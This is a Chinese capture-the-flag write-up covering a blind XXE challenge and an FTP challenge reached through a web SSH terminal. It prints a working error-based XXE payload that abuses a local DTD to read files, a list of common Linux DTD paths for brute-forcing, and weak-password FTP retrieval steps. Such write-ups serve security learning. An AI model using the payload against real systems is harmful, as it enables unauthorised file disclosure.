### LookAround 

打开网页是个时钟

![1566874216470](images\1566874216470.png)

查看html源码也没东西，辛亏在js代码看到一些东西

![1566874281183](images\1566874281183.png)

每隔是10秒请求一次

![1566874451647](images\1566874451647.png)

不多说，直接抓包

![1566874613871](images\1566874613871.png)

有点XXE的感觉，直接测试

![1566874726027](images\1566874726027.png)

没回显，以为没戏，就随便输了个文件看看

![1566874828042](images\1566874828042.png)

看来执行了，只是没回显，可以确定是blind xxe

经过fuzz，内网不能发出http请求，那就尝试利用本地dtd实现xxe回显

Payload

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

flag到手

![1566875398348](images\1566875398348.png)

这里再贴一下linux下可能存在的dtd

```
./properties/schemas/j2ee/XMLSchema.dtd
./../properties/schemas/j2ee/XMLSchema.dtd
./../../properties/schemas/j2ee/XMLSchema.dtd
/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd
/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd
/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd
/usr/share/doc/python2-docutils/docs/ref/docutils.dtd
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd
/usr/share/boostbook/dtd/1.1/boostbook.dtd
/usr/share/boostbook/dtd/boostbook.dtd
/usr/share/dblatex/schema/dblatex-config.dtd
/usr/share/struts/struts-config_1_0.dtd
/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd
```

一个个爆破，再替换xml中实体名字就可以。

---

### Easy Realworld Challenge 

Gate one web ssh终端

这里出题人并没有删除**logviwer**，

![1566871247158](images\1566871247158.png)

可以看到其他选手和出题的登录，右边小黑框动画形式呈现

![1566871299030](images\1566871299030.png)

从中可以看到其他选手尝试连接FTP，推测内网有FTP服务

尝试连接。

![1566871555974](images\1566871555974.png)

弱密码，连接成功

这里贴一下FTP基本命令

![1566872292467](images\1566872292467.png)

**LIST**看一下目录

![1566872409659](images\1566872409659.png)

再贴一下FTP响应代码

![1566873383147](images\1566873383147.png)

这里也提示了要PASV反向连接

![1566872753209](images\1566872753209.png)

计算端口

```
(xxx,xxx,xxx,xxx,a,b)
a*256+b
36*256+15 = 9231
```

端口为9231，在另一个terminal连接（用另一个浏览器打开新的），用户随便

![1566872904544](images\1566872904544.png)

在第一个terminal查看flag，题目有提示

![1566873150172](images\1566873150172.png)

所以

```
RETR /flag
```

![1566872822129](images\1566872822129.png)

在第二窗口即可看到回显

![1566872836649](images\1566872836649.png)

### 参考文章

- https://www.zhaoj.in/read-6251.html?tdsourcetag=s_pctim_aiomsg

- https://blog.csdn.net/nowhere_/article/details/44877439

- [https://www.mi1k7ea.com/2019/06/27/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9C%8B%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0XXE%E6%94%BB%E5%87%BB/](https://www.mi1k7ea.com/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/)

- https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation

  